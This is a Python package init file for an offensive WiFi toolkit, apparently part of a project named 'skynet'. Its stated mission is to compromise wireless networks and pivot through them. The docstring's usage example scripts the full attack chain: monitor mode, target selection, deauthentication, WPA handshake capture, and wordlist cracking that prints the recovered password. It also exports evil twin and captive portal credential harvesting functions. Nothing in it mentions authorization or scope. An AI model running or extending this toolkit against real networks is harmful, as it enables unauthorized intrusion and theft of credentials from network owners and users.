"""
KRYON WiFi Penetration Tools

Complete WiFi penetration testing toolkit.

Clearance Level: Alpha-Red (Offensive Wireless Operations)
Mission: Compromise wireless networks and pivot through WiFi

Available Modules:
- wifi_attacks: WiFi scanning, handshake capture, WPA cracking, deauth attacks
- evil_twin: Rogue AP, evil twin, captive portal credential harvesting

Example Usage:
    >>> from skynet.tools.wifi import (
    ...     scan_wifi_networks,
    ...     enable_monitor_mode,
    ...     capture_handshake,
    ...     crack_wpa_handshake,
    ...     deauth_attack,
    ...     create_evil_twin
    ... )
    >>>
    >>> # Enable monitor mode
    >>> result = enable_monitor_mode("wlan0")
    >>> monitor_iface = result['monitor_interface']
    >>>
    >>> # Scan for networks
    >>> scan = scan_wifi_networks(monitor_iface, timeout=60)
    >>> target = scan['networks'][0]  # Select target
    >>>
    >>> # Capture handshake
    >>> handshake = capture_handshake(
    ...     bssid=target['bssid'],
    ...     channel=target['channel'],
    ...     interface=monitor_iface,
    ...     deauth_clients=True
    ... )
    >>>
    >>> # Crack password
    >>> if handshake['handshake_captured']:
    ...     result = crack_wpa_handshake(
    ...         capture_file=handshake['capture_file'],
    ...         wordlist="/usr/share/wordlists/rockyou.txt"
    ...     )
    ...     if result['password_found']:
    ...         print(f"Password: {result['password']}")
"""

from .evil_twin import create_evil_twin, get_captured_credentials, stop_evil_twin
from .wifi_attacks import (
    capture_handshake,
    crack_wpa_handshake,
    deauth_attack,
    disable_monitor_mode,
    enable_monitor_mode,
    scan_wifi_networks,
)

__all__ = [
    # WiFi Attack functions
    "scan_wifi_networks",
    "enable_monitor_mode",
    "disable_monitor_mode",
    "capture_handshake",
    "crack_wpa_handshake",
    "deauth_attack",
    # Evil Twin functions
    "create_evil_twin",
    "stop_evil_twin",
    "get_captured_credentials",
]
